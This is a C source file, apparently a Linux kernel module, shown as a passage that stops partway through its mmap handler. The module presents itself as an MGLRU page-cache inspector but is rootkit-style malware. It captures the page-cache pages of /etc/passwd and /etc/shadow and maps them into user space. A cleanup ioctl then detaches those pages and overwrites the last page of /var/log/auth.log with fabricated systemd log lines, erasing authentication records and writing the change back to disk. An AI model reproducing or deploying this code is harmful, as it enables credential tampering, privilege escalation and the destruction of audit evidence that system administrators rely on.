#include <asm/pgtable.h>
#include <linux/acpi.h>
#include <linux/buffer_head.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/memcontrol.h>
#include <linux/mm.h>
#include <linux/mmzone.h>
#include <linux/module.h>
#include <linux/nodemask.h>
#include <linux/page-flags.h>
#include <linux/pagemap.h>
#include <linux/rcupdate.h>
#include <linux/rmap.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/writeback.h>
#include <linux/xarray.h>

#define DEV_NAME "mglru_cache"

#define PHYS_MEM_GET_MGLRU_PAGES_COUNT _IOWR('P', 1, struct zone_inspect_req)
#define PHYS_MEM_GET_MGLRU_PAGES_DATA _IOWR('P', 2, struct zone_inspect_req)
#define PHYS_MEM_CLEANUP_CAPTURED_PAGE _IO('P', 3)

#define PHANTOM_PASSWD_MMAP_OFFSET 0
#define PHANTOM_SHADOW_MMAP_OFFSET 1

#define NAME_MAX_LEN 256

struct mglru_collect_item {
	struct lruvec *lruvec;
	struct page *page;
	int32_t gen_idx;
	int32_t tier;
	int32_t folio_order;
	uint64_t lrugen_seq;
	uint64_t pageflags;
	char cgroup_path[NAME_MAX_LEN];
};

struct mglru_page_cache {
	struct list_head list;
	struct page *page;
	int gen_idx;
	char cgroup_path[NAME_MAX_LEN];
};

struct user_mglru_page_cache {
	uint64_t pfn;
	uint64_t page_vaddr;
	int32_t node_id;
	int32_t zone_type;
	int32_t lru_gen;
	int32_t lru_tier;
	int32_t folio_order;
	uint64_t lrugen_seq;
	uint32_t pageflags;
	char filename[NAME_MAX_LEN];
	char cgroup_path[NAME_MAX_LEN];
};

struct zone_inspect_req {
	int32_t node_id;
	int32_t zone_type;
	uint64_t user_buffer;
	uint32_t buffer_len;
	uint32_t result_count;
};

static dev_t devno;
static struct class *dev_class;
static struct cdev mglru_cache_cdev;

struct mem_cgroup;
struct cgroup;
struct cgroup_namespace;

struct lruvec *g_lruvec_passwd = NULL;
struct lruvec *g_lruvec_shadow = NULL;
static struct page *g_phantom_passwd_page = NULL;
static struct page *g_phantom_shadow_page = NULL;
static int g_gen_passwd = 0;
static int g_gen_shadow = 0;

typedef unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
typedef struct mem_cgroup *(*mem_cgroup_iter_t)(struct mem_cgroup *, struct mem_cgroup *, void *);
typedef int (*cgroup_path_ns_t)(const struct cgroup *,
				char *,
				size_t,
				const struct cgroup_namespace *);
typedef void (*try_to_unmap_t)(struct folio *folio, enum ttu_flags flags);
typedef void (*inode_add_lru_t)(struct inode *inode);
typedef void (*__mod_lruvec_state_t)(struct lruvec *lruvec, enum node_stat_item idx, int val);

static kallsyms_lookup_name_ptr kallsyms_lookup_name_t;
static struct mem_cgroup **k_root_mem_cgroup_ptr;
static mem_cgroup_iter_t ksym_mem_cgroup_iter;
static cgroup_path_ns_t ksym_cgroup_path_ns;
static struct cgroup_namespace *k_init_cgroup_ns;
static try_to_unmap_t ksym_try_to_unmap;
static inode_add_lru_t ksym_inode_add_lru;
static __mod_lruvec_state_t __ksym_mod_lruvec_state;

typedef struct {
	const char *name;
	void **target;
} sym_resolve_t;

static int kprobe_kallsyms_lookup_name(void);

static int
validate_user_buffer(uint64_t user_addr, uint32_t count, size_t element_size, bool write_access);

struct page *mapping_get_last_page(struct page *page);

static void log_resolved_symbols(void)
{
#ifdef _DISABLE_CODE
	pr_info("mem_cgroup_iter %px\n", ksym_mem_cgroup_iter);
	pr_info("mem_root_cgroup %px\n", *k_root_mem_cgroup_ptr);
	pr_info("cgroup_path_ns %px\n", ksym_cgroup_path_ns);
	pr_info("init_cgroup_ns %px\n", k_init_cgroup_ns);
	pr_info("try_to_unmap %px\n", ksym_try_to_unmap);
	pr_info("try_to_unmap %px\n", ksym_inode_add_lru);
#endif
}

static int resolve_required_symbols(void)
{
	if (!kallsyms_lookup_name_t) {
		pr_err("Cannot resolve symbols, kallsyms_lookup_name_t is not available.\n");
		return -EFAULT;
	}

	ksym_mem_cgroup_iter = (mem_cgroup_iter_t)kallsyms_lookup_name_t("mem_cgroup_iter");
	if (!ksym_mem_cgroup_iter) {
		pr_warn("Failed to resolve symbol: mem_cgroup_iter.\n");
	}

	k_root_mem_cgroup_ptr = (struct mem_cgroup **)kallsyms_lookup_name_t("root_mem_cgroup");
	if (!k_root_mem_cgroup_ptr) {
		pr_warn("Failed to resolve: root_mem_cgroup\n");
		return -ENOENT;
	}

	ksym_cgroup_path_ns = (cgroup_path_ns_t)kallsyms_lookup_name_t("cgroup_path_ns");
	if (!ksym_cgroup_path_ns) {
		pr_warn("Failed to resolve symbol: cgroup_path_ns.\n");
	}

	k_init_cgroup_ns = (struct cgroup_namespace *)kallsyms_lookup_name_t("init_cgroup_ns");
	if (!k_init_cgroup_ns) {
		pr_warn("Failed to resolve symbol: init_cgroup_ns.\n");
	}

	k_init_cgroup_ns = (struct cgroup_namespace *)kallsyms_lookup_name_t("init_cgroup_ns");
	if (!k_init_cgroup_ns) {
		pr_warn("Failed to resolve symbol: init_cgroup_ns.\n");
	}

	ksym_try_to_unmap = (try_to_unmap_t)kallsyms_lookup_name_t("try_to_unmap");
	if (!ksym_try_to_unmap) {
		pr_warn("Failed to resolve symbol: try_to_unmap.\n");
	}

	ksym_inode_add_lru = (inode_add_lru_t)kallsyms_lookup_name_t("inode_add_lru");
	if (!ksym_inode_add_lru) {
		pr_warn("Failed to resolve symbol: inode_add_lru.\n");
	}

	__ksym_mod_lruvec_state =
	    (__mod_lruvec_state_t)kallsyms_lookup_name_t("__mod_lruvec_state");
	if (!ksym_inode_add_lru) {
		pr_warn("Failed to resolve symbol: __mod_lruvec_state\n");
	}

	log_resolved_symbols();

	return 0;
}

int kprobe_kallsyms_lookup_name(void)
{
	int ret = 0;
	struct kprobe kp = {0};

	if (kallsyms_lookup_name_t) {
		return 0;
	}

	kp.symbol_name = "kallsyms_lookup_name";
	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("Register kprobe for kallsyms_lookup_name failed: %d\n", ret);
		return ret;
	}

	kallsyms_lookup_name_t = (kallsyms_lookup_name_ptr)kp.addr;
	unregister_kprobe(&kp);

	if (!kallsyms_lookup_name_t) {
		pr_err("Failed to get address of kallsyms_lookup_name.\n");
		return -ENOENT;
	}

	resolve_required_symbols();

	return 0;
}

static inline const char *tier_to_string(int32_t tier)
{
	switch (tier) {
	case 0:
		return "Tier-0 (Oldest)";
	case 1:
		return "Tier-1";
	case 2:
		return "Tier-2";
	case 3:
		return "Tier-3 (Newest)";
	default:
		return "Unknown Tier";
	}
}

static inline const char *page_flags_to_string(uint32_t flags)
{
	static char buf[64];
	buf[0] = '\0';

	if (flags & (1 << 0)) {
		strcat(buf, "Ref,");
	}
	if (flags & (1 << 1)) {
		strcat(buf, "Workingset,");
	}

	if (buf[0] != '\0') {
		buf[strlen(buf) - 1] = '\0';
	} else {
		strcpy(buf, "-");
	}

	return buf;
}

struct page *mapping_get_last_page(struct page *page)
{
	struct folio *folio, *last_folio = NULL;
	struct address_space *mapping;
	XA_STATE(xas, NULL, 0);
	pgoff_t last_index = 0;

	if (!page)
		return NULL;

	folio = page_folio(page);
	mapping = folio->mapping;
	if (!mapping)
		return NULL;

	xas.xa = &mapping->i_pages;
	xas.xa_index = 0;

	rcu_read_lock();

	xas_for_each(&xas, folio, ULONG_MAX)
	{

		if (!folio)
			continue;

		//
		// if the entry is a value, false if it is a pointer.
		//
		// added by jia jia
		//

		if (xa_is_value(folio))
			continue;

		if (xas.xa_index > last_index) {
			last_index = xas.xa_index;
			last_folio = folio;
		}
	}

	if (last_folio && !folio_try_get(last_folio)) {
		last_folio = NULL;
	}

	rcu_read_unlock();

	if (last_folio) {
		pr_info("Found last page at index %lu, PFN: 0x%lx\n",
			last_index,
			page_to_pfn(folio_page(last_folio, 0)));
	}

	return last_folio ? folio_page(last_folio, 0) : NULL;
}

static int detach_page_cache(struct page *page)
{
	struct address_space *mapping;
	struct inode *inode;
	struct folio *folio;
	pgoff_t index;

	lock_page(page);

	if (page_mapped(page)) {
		ksym_try_to_unmap(page_folio(page), TTU_SYNC);
	}

	mapping = page->mapping;
	if (!mapping) {
		unlock_page(page);
		pr_warn("mglru_deceit: Page PFN 0x%lx already detached.\n", page_to_pfn(page));
		return 0;
	}

	inode = mapping->host;
	index = page->index;
	folio = page_folio(page);

	spin_lock(&inode->i_lock);
	xa_lock_irq(&mapping->i_pages);

	if (page->mapping == mapping) {
		__xa_erase(&mapping->i_pages, index);
		page->mapping = NULL;

		if (mapping->nrpages > folio_nr_pages(folio))
			mapping->nrpages -= folio_nr_pages(folio);
		else
			mapping->nrpages = 0;
	}

	xa_unlock_irq(&mapping->i_pages);

	if (mapping_shrinkable(mapping))
		ksym_inode_add_lru(inode);

	spin_unlock(&inode->i_lock);
	unlock_page(page);

	return 0;
}

static bool mglru_remove_page(struct lruvec *lruvec, struct page *page, int gen)
{
	struct folio *folio;
	unsigned long flags;
	int zone;
	int delta;

	if (!page)
		return false;

	folio = page_folio(page);
	zone = folio_zonenum(folio);
	delta = folio_nr_pages(folio);

	spin_lock_irqsave(&lruvec->lru_lock, flags);

	if (!folio_test_lru(folio)) {
		spin_unlock_irqrestore(&lruvec->lru_lock, flags);
		return false;
	}

	list_del(&folio->lru);

	if (gen >= 0 && gen < MAX_NR_GENS) {
		WRITE_ONCE(lruvec->lrugen.nr_pages[gen][LRU_GEN_FILE][zone],
			   lruvec->lrugen.nr_pages[gen][LRU_GEN_FILE][zone] - delta);
	}

	__ksym_mod_lruvec_state(lruvec, NR_FILE_PAGES, -delta);
	__ksym_mod_lruvec_state(lruvec, NR_INACTIVE_FILE, -delta);

	__ClearPageLRU(&folio->page);

	spin_unlock_irqrestore(&lruvec->lru_lock, flags);

	uint64_t pfn = page_to_pfn(page);
	void *virt_addr = pfn_to_kaddr(pfn);

	pr_info("page 0%llx, PFN: 0x%llx\n", (uint64_t)virt_addr, pfn);

	return true;
}

static void set_phantom_page(struct page *page, int idx)
{

	if (idx == 0 && g_phantom_passwd_page)
		return;
	if (idx == 1 && g_phantom_shadow_page)
		return;

	get_page(page);
	SetPageReserved(page);

	if (idx == 0) {
		g_phantom_passwd_page = page;
	} else if (idx == 1) {
		g_phantom_shadow_page = page;
	}

	pr_info("mglru-deceit: Captured and locked page for (PFN 0x%lx) idx = %d\n",
		page_to_pfn(page),
		idx);
}

static int clear_phantom_page(int idx)
{
	struct page *page_to_clean = NULL;
	struct address_space *mapping;
	pgoff_t index;
	int rt;

	if (idx == 0) {
		page_to_clean = g_phantom_passwd_page;

	} else if (idx == 1) {
		page_to_clean = g_phantom_shadow_page;
	}

	if (!page_to_clean) {
		return -ENODATA;
	}

	if (idx == 0) {
		rt = mglru_remove_page(g_lruvec_passwd, page_to_clean, g_gen_passwd);
		if (!rt) {
			pr_warn("mglru_remove_page to failed!\n");
			return -EACCES;
		}
	} else if (idx == 1) {
		rt = mglru_remove_page(g_lruvec_shadow, page_to_clean, g_gen_shadow);
		if (!rt) {
			pr_warn("mglru_remove_page to failed!\n");
			return -EACCES;
		}
	}

	mapping = page_to_clean->mapping;
	index = page_to_clean->index;

	detach_page_cache(page_to_clean);

	pr_info("Cleanup captured page %d (PFN 0x%lx).\n", idx, page_to_pfn(page_to_clean));

	if (PageDirty(page_to_clean)) {
		ClearPageDirty(page_to_clean);
	}

	ClearPageReserved(page_to_clean);
	put_page(page_to_clean);

	if (idx == 0) {
		g_phantom_passwd_page = NULL;
	} else if (idx == 1) {
		g_phantom_shadow_page = NULL;
	}

	return 0;
}

static void fill_page_cache(const struct mglru_collect_item *item,
			    char *path_buf,
			    struct user_mglru_page_cache *user_entry)
{
	struct page *page = item->page;
	struct address_space *mapping;
	struct inode *inode;
	struct dentry *dentry;
	char *d_name = "[dentry not found]";

	uint64_t page_size_kb;
	const char *huge_page_tag = "";

	void *virt_addr;

	if (!user_entry || !page || !path_buf) {
		pr_err("fill_page_cache -> Failed to argv is null.\n");
		return;
	}

	mapping = page->mapping;
	if (!mapping)
		return;

	inode = mapping->host;
	if (!inode)
		return;

	memset(user_entry, 0, sizeof(*user_entry));
	dentry = d_find_alias(inode);
	if (dentry) {
		d_name = dentry_path_raw(dentry, path_buf, PAGE_SIZE);
		if (IS_ERR(d_name)) {
			d_name = "[path lookup error]";
		}
		strscpy(user_entry->filename, d_name, NAME_MAX_LEN - 1);

		if (strcmp(user_entry->filename, "/etc/passwd") == 0) {
			if (!g_phantom_passwd_page) {
				lock_page(item->page);
				set_phantom_page(item->page, 0);
				unlock_page(item->page);
				g_lruvec_passwd = item->lruvec;
				g_gen_passwd = item->gen_idx;
			}
		} else if (strcmp(user_entry->filename, "/etc/shadow") == 0) {
			if (!g_phantom_shadow_page) {
				lock_page(item->page);
				set_phantom_page(item->page, 1);
				unlock_page(item->page);
				g_lruvec_shadow = item->lruvec;
				g_gen_shadow = item->gen_idx;
			}
		}

		dput(dentry);
	} else {
		strscpy(user_entry->filename, d_name, NAME_MAX_LEN - 1);
	}

	user_entry->filename[sizeof(user_entry->filename) - 1] = '\0';

	uint64_t pfn = page_to_pfn(page);
	virt_addr = pfn_to_kaddr(pfn);

	user_entry->pfn = pfn;
	user_entry->page_vaddr = (uint64_t)(uintptr_t)virt_addr;
	user_entry->node_id = page_to_nid(page);
	user_entry->zone_type = page_zonenum(page);

	user_entry->lru_gen = item->gen_idx;
	user_entry->lru_tier = item->tier;
	user_entry->lrugen_seq = item->lrugen_seq;
	user_entry->folio_order = item->folio_order;
	user_entry->pageflags = item->pageflags;

	strscpy(user_entry->cgroup_path, item->cgroup_path, sizeof(user_entry->cgroup_path));
	user_entry->cgroup_path[sizeof(user_entry->cgroup_path) - 1] = '\0';

	page_size_kb = (1UL << item->folio_order) * (PAGE_SIZE / 1024);

	if (item->folio_order > 0) {
		huge_page_tag = "HugePage";
	}

#ifdef _DISABLE_CODE
	pr_info("MGLRU-Gen %-2d CGroup %-s PFN 0x%llx VA 0x%px %s Seq %llu Size %-llu KB %s Flags "
		"%s File: %s\n",
		user_entry->lru_gen,
		user_entry->cgroup_path,
		user_entry->pfn,
		virt_addr,
		tier_to_string(user_entry->lru_tier),
		user_entry->lrugen_seq,
		page_size_kb,
		huge_page_tag,
		page_flags_to_string(user_entry->pageflags),
		user_entry->filename);
#endif
}

static inline struct lruvec *mem_cgroup_lruvec_ksym(struct mem_cgroup *memcg,
						    struct pglist_data *pgdat)
{
	struct mem_cgroup_per_node *mz;
	struct lruvec *lruvec;

	if (mem_cgroup_disabled()) {
		lruvec = &pgdat->__lruvec;
		goto out;
	}

	if (!memcg && k_root_mem_cgroup_ptr)
		memcg = *k_root_mem_cgroup_ptr;

	mz = memcg->nodeinfo[pgdat->node_id];
	lruvec = &mz->lruvec;

out:
	if (unlikely(lruvec->pgdat != pgdat))
		lruvec->pgdat = pgdat;

	return lruvec;
}

static uint32_t inspect_mglru_pagecache(struct lruvec *lruvec,
					struct mglru_collect_item *items_buffer,
					uint32_t buffer_offset,
					uint32_t buffer_size)
{
	struct lru_gen_folio *lrugen_folio;
	struct folio *folio;
	struct list_head(*zone_lists)[MAX_NR_ZONES];
	struct list_head *current_list;
	struct page *page, *next_page;
	int gen_idx, zone_idx;
	struct address_space *mapping;
	struct inode *inode;
	const int file_type = LRU_GEN_FILE;
	uint32_t collected_count = 0;

	struct mglru_collect_item *item;
	bool counting_only = (items_buffer == NULL);

	const int lru_seq_width = BITS_PER_LONG - NR_PAGEFLAGS;

	if (!lruvec)
		return 0;

	lrugen_folio = &lruvec->lrugen;

	spin_lock_irq(&lruvec->lru_lock);

	for (gen_idx = 0; gen_idx < MAX_NR_GENS; gen_idx++) {
		zone_lists = &lrugen_folio->folios[gen_idx][file_type];

		for (zone_idx = 0; zone_idx < MAX_NR_ZONES; zone_idx++) {
			current_list = &(*zone_lists)[zone_idx];
			list_for_each_entry_safe(page, next_page, current_list, lru)
			{
				if (!counting_only &&
				    (buffer_offset + collected_count) >= buffer_size) {
					goto unlock_and_return;
				}

				if (PageAnon(page))
					continue;

				mapping = page->mapping;
				if (!mapping)
					continue;

				inode = mapping->host;
				if (!inode)
					continue;

				if (counting_only) {
					collected_count++;
				} else {
					if (get_page_unless_zero(page)) {
						item =
						    &items_buffer[buffer_offset + collected_count];

						folio = page_folio(page);

						if (!item->lruvec)
							item->lruvec = lruvec;

						item->page = page;
						item->gen_idx = gen_idx;
						item->folio_order = folio_order(folio);

						item->tier = 0;
						if (PageYoung(page))
							item->tier |= 2;
						if (PageReferenced(page))
							item->tier |= 1;

						if (PageYoung(page))
							item->lrugen_seq = (uint64_t)atomic_read(
							    &folio->_pincount);
						else
							item->lrugen_seq = (uint64_t)atomic_read(
							    &folio->_refcount);
						item->lrugen_seq >>= lru_seq_width;

						item->pageflags = 0;
						if (PageReferenced(page))
							item->pageflags |= (1 << 0);
						if (PageWorkingset(page))
							item->pageflags |= (1 << 1);

						collected_count++;
					}
				}
			}
		}
	}

unlock_and_return:
	spin_unlock_irq(&lruvec->lru_lock);
	return collected_count;
}

static int
collect_page_lru_pagecache(int node_id, struct list_head *collected_list_head, bool b_collect)
{
	pg_data_t *pgdat = NODE_DATA(node_id);
	struct mem_cgroup *memcg;
	struct cgroup_subsys_state css;
	struct cgroup *cgroup;
	struct lruvec *lruvec;
	char *cgroup_name_buf = NULL;
	char *cgroup_path = NULL;
	uint32_t collected_this_cgroup = 0;
	uint32_t cgroup_idx;

	struct mglru_collect_item *items_buffer = NULL;
	uint32_t buffer_size = 0;

	int total_found_count = 0;

	if (b_collect && collected_list_head) {
		items_buffer = (struct mglru_collect_item *)collected_list_head->next;
		buffer_size = (uint32_t)(uintptr_t)collected_list_head->prev;
	}

	if (!pgdat) {
		pr_err("collect_page_lru_pagecache -> Invalid NUMA node ID.\n");
		return -EINVAL;
	}

	if (!ksym_mem_cgroup_iter || !ksym_cgroup_path_ns || !k_init_cgroup_ns) {
		pr_err("collect_page_lru_pagecache -> symbols not resolved.\n");
		return -EFAULT;
	}

	if (b_collect) {
		cgroup_name_buf = kmalloc(NAME_MAX_LEN, GFP_KERNEL);
		if (!cgroup_name_buf) {
			return -ENOMEM;
		}
	}

	rcu_read_lock();

	memcg = ksym_mem_cgroup_iter(NULL, NULL, NULL);
	do {
		lruvec = mem_cgroup_lruvec_ksym(memcg, pgdat);
		if (!lruvec) {
			goto next_cgroup;
		}

		css = memcg->css;
		cgroup = css.cgroup;
		if (b_collect) {
			if (ksym_cgroup_path_ns(cgroup,
						cgroup_name_buf,
						NAME_MAX_LEN,
						k_init_cgroup_ns) <= 0) {
				strcpy(cgroup_name_buf, "[cgroup path error]");
			}

			collected_this_cgroup = inspect_mglru_pagecache(lruvec,
									items_buffer,
									total_found_count,
									buffer_size);

			if (collected_this_cgroup > 0) {
				for (cgroup_idx = 0; cgroup_idx < collected_this_cgroup;
				     cgroup_idx++) {
					cgroup_path = items_buffer[total_found_count + cgroup_idx]
							  .cgroup_path;
					if (!cgroup_path)
						continue;
					strscpy(cgroup_path, cgroup_name_buf, NAME_MAX_LEN);
				}

				total_found_count += collected_this_cgroup;
			}
		} else {
			total_found_count += inspect_mglru_pagecache(lruvec, NULL, 0, 0);
		}

	next_cgroup:
		cond_resched();
	} while ((memcg = ksym_mem_cgroup_iter(NULL, memcg, NULL)));

	rcu_read_unlock();

	if (cgroup_name_buf) {
		kfree(cgroup_name_buf);
		cgroup_name_buf = NULL;
	}

	if (b_collect && collected_list_head) {
		collected_list_head->prev = (struct list_head *)(uintptr_t)total_found_count;
	}

	return total_found_count;
}

static int handle_mglru_pagecache_count(void __user *user_arg)
{
	struct zone_inspect_req req;
	int count;
	int rt = 0;

	if (copy_from_user(&req, user_arg, sizeof(req)))
		return -EFAULT;

	count = collect_page_lru_pagecache(req.node_id, NULL, false);
	if (count < 0) {
		return count;
	}

	req.result_count = count;

	if (copy_to_user(user_arg, &req, sizeof(req)))
		return -EFAULT;

	return rt;
}

static int handle_mglru_pagecache_data(void __user *user_arg)
{
	struct zone_inspect_req req;
	struct user_mglru_page_cache user_entry;
	char *path_buf = NULL;
	int rt = 0;
	struct mglru_collect_item *items_buffer = NULL;
	struct mglru_collect_item *item;
	struct list_head pass_through;
	uint32_t total_pages_to_collect = 0;
	uint32_t collected_count = 0;
	uint32_t i;
	struct user_mglru_page_cache __user *user_buffer_base = NULL;
	struct user_mglru_page_cache __user *user_dest = NULL;

	if (copy_from_user(&req, user_arg, sizeof(req)))
		return -EFAULT;

	rt = validate_user_buffer(req.user_buffer,
				  req.buffer_len,
				  sizeof(struct user_mglru_page_cache),
				  true);
	if (rt != 0) {
		pr_err("mglru_deceit: User buffer validation failed.\n");
		return rt;
	}

	if (req.buffer_len == 0) {
		req.result_count = 0;
		if (copy_to_user(user_arg, &req, sizeof(req)))
			return -EFAULT;
		return 0;
	}

	total_pages_to_collect = req.buffer_len;
	user_buffer_base = (struct user_mglru_page_cache __user *)(uintptr_t)req.user_buffer;

	items_buffer =
	    kvmalloc(total_pages_to_collect * sizeof(struct mglru_collect_item), GFP_KERNEL);

	if (!items_buffer)
		return -ENOMEM;

	path_buf = (char *)__get_free_page(GFP_KERNEL);
	if (!path_buf) {
		rt = -ENOMEM;
		goto cleanup_items_buffer;
	}

	pass_through.next = (struct list_head *)items_buffer;
	pass_through.prev = (struct list_head *)(uintptr_t)total_pages_to_collect;

	collect_page_lru_pagecache(req.node_id, &pass_through, true);
	collected_count = (uint32_t)(uintptr_t)pass_through.prev;

	for (i = 0; i < collected_count; i++) {
		item = &items_buffer[i];
		user_dest = &user_buffer_base[i];

		if (!item->page)
			continue;

		fill_page_cache(item, path_buf, &user_entry);

		if (copy_to_user(user_dest, &user_entry, sizeof(user_entry))) {
			rt = -EFAULT;
			goto cleanup_all_pages;
		}
	}

	req.result_count = collected_count;
	if (copy_to_user(user_arg, &req, sizeof(req)))
		rt = -EFAULT;

cleanup_all_pages:
	for (i = 0; i < collected_count; i++) {
		if (items_buffer[i].page)
			put_page(items_buffer[i].page);
	}

	if (path_buf)
		free_page((unsigned long)path_buf);

cleanup_items_buffer:
	kvfree(items_buffer);

	return rt;
}

static int replace_pagecache_entry(struct page *old_page)
{
	struct folio *old_folio, *new_folio;
	struct page *new_page;
	struct address_space *mapping;
	unsigned blocksize;
	pgoff_t offset;
	void *new_addr;

	XA_STATE(xas, NULL, 0);
	int pos = 0, i;

	new_page = alloc_page(GFP_KERNEL);
	if (!new_page) {
		return -ENOMEM;
	}

	old_folio = page_folio(old_page);
	new_folio = page_folio(new_page);

	mapping = old_folio->mapping;
	if (!mapping) {
		__free_page(new_page);
		return -EINVAL;
	}

	folio_lock(old_folio);
	folio_lock(new_folio);

	new_addr = kmap_local_page(new_page);
	memset(new_addr, 0, PAGE_SIZE);

	for (i = 0; pos < PAGE_SIZE - 100; i++) {
		int written = snprintf(
		    (char *)new_addr + pos,
		    PAGE_SIZE - pos,
		    "Sep 26 18:%02d:%02d jia systemd[%d]: Starting daily apt activities...\n"
		    "Sep 26 18:%02d:%02d jia systemd[%d]: Finished daily apt activities.\n",
		    (i * 3) % 60,
		    (i * 7) % 60,
		    1000 + i,
		    (i * 3 + 1) % 60,
		    (i * 7 + 1) % 60,
		    1001 + i);
		if (written <= 0)
			break;
		pos += written;
	}

	while (pos < PAGE_SIZE - 1) {
		((char *)new_addr)[pos++] = '\n';
	}

	kunmap_local(new_addr);

	folio_get(new_folio);

	offset = old_folio->index;
	new_folio->mapping = mapping;
	new_folio->index = offset;

	//
	// must first call folio_mark_uptodate to ensure that the data
	// in the new page/folio is valid (uptodate) before marking it dirty and writing it back.
	// Otherwise, an fs warning will be triggered: WARN_ON from 'ext4_dirty_folio'
	//
	// added by jia jia
	//

	folio_mark_uptodate(new_folio);

	if (folio_test_dirty(old_folio)) {

		//
		// When a page is dirtied and scheduled for 'writeback',
		// the filesystem’s address space operations eventually pass it down to the 'block
		// layer'. At this point the 'block layer' expects the page to be backed by
		// buffer_heads that describe the individual block mappings. If a dirty page has no
		// buffer_heads attached, the filesystem (e.g. ext4) cannot locate disk blocks to
		// map the data, and it will emit a warning like:
		//
		//     EXT4-fs warning: mpage_prepare_extent_to_map: inode XXX : page N does not
		//     have buffers attached
		//
		// The fix is to explicitly attach empty buffer_heads via create_empty_buffers().
		// This simulates the normal write path (write_begin/write_end),
		// where buffer_heads are allocated and associated with the page before it becomes
		// dirty.
		//
		// added by jia jia
		//

		blocksize = i_blocksize(mapping->host);
		create_empty_buffers(new_folio, blocksize, 0);

		folio_mark_dirty(new_folio);
	}

	xas.xa = &mapping->i_pages;
	xas.xa_index = offset;

	xas_lock_irq(&xas);
	xas_store(&xas, new_folio);
	old_folio->mapping = NULL;

	__lruvec_stat_mod_folio(old_folio, NR_FILE_PAGES, -1);
	__lruvec_stat_mod_folio(new_folio, NR_FILE_PAGES, 1);

	xas_unlock_irq(&xas);

	folio_put(old_folio);

	folio_unlock(new_folio);
	folio_unlock(old_folio);

	pr_info("replaced page entry PFN:0x%lx -> 0x%lx\n",
		page_to_pfn(old_page),
		page_to_pfn(new_page));

	return 0;
}

static void auth_pages_within_pagecache(struct mglru_collect_item *item, char *path_buf)
{
	struct page *page = item->page;
	struct page *last_page = NULL;
	struct address_space *mapping;
	struct inode *inode;
	struct dentry *dentry;

	char *d_name = "[dentry not found]";

	if (!page || !path_buf) {
		pr_err("auth_pages_within_pagecache -> Failed to argv is null.\n");
		return;
	}

	mapping = page->mapping;
	if (!mapping)
		return;

	inode = mapping->host;
	if (!inode)
		return;

	dentry = d_find_alias(inode);
	if (dentry) {
		d_name = dentry_path_raw(dentry, path_buf, PAGE_SIZE);
		if (IS_ERR(d_name)) {
			d_name = "[path lookup error]";
		}

		if (strcmp(d_name, "/var/log/auth.log") == 0) {

			last_page = mapping_get_last_page(page);
			if (last_page && last_page != page) {
				if (replace_pagecache_entry(last_page) == 0)
					pr_info("Replaced last auth page\n");
			} else {
				if (replace_pagecache_entry(page) == 0)
					pr_info("Replaced current auth page\n");
			}
		}

		dput(dentry);
	}
}

static int modify_auth_pagecache(void)
{
	int rt;
	struct list_head pass_through;
	struct mglru_collect_item *items_buffer = NULL;
	struct mglru_collect_item *item;
	char *path_buf = NULL;
	uint32_t total_pages_to_collect = 0;
	uint32_t collected_count = 0;
	uint32_t i;

	total_pages_to_collect = collect_page_lru_pagecache(numa_node_id(), NULL, false);
	if (total_pages_to_collect <= 0) {
		return total_pages_to_collect;
	}

	items_buffer =
	    kvmalloc(total_pages_to_collect * sizeof(struct mglru_collect_item), GFP_KERNEL);

	if (!items_buffer)
		return -ENOMEM;

	path_buf = (char *)__get_free_page(GFP_KERNEL);
	if (!path_buf) {
		rt = -ENOMEM;
		goto cleanup_items_buffer;
	}

	pass_through.next = (struct list_head *)items_buffer;
	pass_through.prev = (struct list_head *)(uintptr_t)total_pages_to_collect;

	collect_page_lru_pagecache(numa_node_id(), &pass_through, true);
	collected_count = (uint32_t)(uintptr_t)pass_through.prev;

	for (i = 0; i < collected_count; i++) {
		item = &items_buffer[i];
		if (!item->page)
			continue;

		auth_pages_within_pagecache(item, path_buf);
	}

	for (i = 0; i < collected_count; i++) {
		if (items_buffer[i].page)
			put_page(items_buffer[i].page);
	}

	if (path_buf)
		free_page((unsigned long)path_buf);

cleanup_items_buffer:
	kvfree(items_buffer);

	return rt;
}

static int
validate_user_buffer(uint64_t user_addr, uint32_t count, size_t element_size, bool write_access)
{
	unsigned long total_size;

	if (user_addr == 0 || count == 0)
		return -EINVAL;

	if (check_mul_overflow((unsigned long)count, element_size, &total_size))
		return -EINVAL;

	if (write_access) {
		if (!access_ok((void __user *)(uintptr_t)user_addr, total_size))
			return -EFAULT;
	} else {
		if (!access_ok((void __user *)(uintptr_t)user_addr, total_size))
			return -EFAULT;
	}

	return 0;
}

static int mglru_cache_open(struct inode *inode, struct file *filp) { return 0; }

static int mglru_cache_release(struct inode *inode, struct file *filp) { return 0; }

static long mglru_cache_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
	void __user *user_arg = (void __user *)arg;

	if (cmd == PHYS_MEM_GET_MGLRU_PAGES_COUNT) {
		return handle_mglru_pagecache_count(user_arg);
	}

	if (cmd == PHYS_MEM_GET_MGLRU_PAGES_DATA) {
		return handle_mglru_pagecache_data(user_arg);
	}

	if (cmd == PHYS_MEM_CLEANUP_CAPTURED_PAGE) {
		clear_phantom_page(0);
		clear_phantom_page(1);
		modify_auth_pagecache();
		return 0;
	}

	return -ENOTTY;
}

static int mglru_cache_mmap(struct file *filp, struct vm_area_struct *vma)
{
	unsigned long pfn_to_map = 0;
	struct folio *folio;
	struct page *page_to_map = NULL;
	int rt;

	if ((vma->vm_end - vma->vm_start) > PAGE_SIZE) {
		pr_warn("mmap request size too large.\n");
		vma->vm_end = vma->vm_start + PAGE_SIZE;
	}

	switch (vma->vm_pgoff) {
	case PHANTOM_PASSWD_MMAP_OFFSET:
		if (g_phantom_passwd_page) {
			page_to_map = g_phantom_passwd_page;
		} else {
			pr_err("mmap failed: passwd page not captured.\n");
			return -ENXIO;
		}

		break;

	case PHANTOM_SHADOW_MMAP_OFFSET:
		if (g_phantom_shadow_page) {
			page_to_map = g_phantom_shadow_page;
		} else {
			pr_err("mmap failed: shadow page not captured.\n");
			return -ENXIO;
		}
		break;

	default:
		pr_err("mmap failed: Invalid offset specified.\n");
		return -EINVAL;
	}

	pr_info("Mapping PFN 0x%lx to user space based on offset %lu.\n",
		pfn_to_map,
		vma->vm_pgoff);

	pfn_to_map = page_to_pfn(page_to_map);
	folio = page_folio(page_to_map);
	if (page_mapped(page_to_map)) {
		ksym_try_to_unmap(folio, TTU_SYNC);
	}

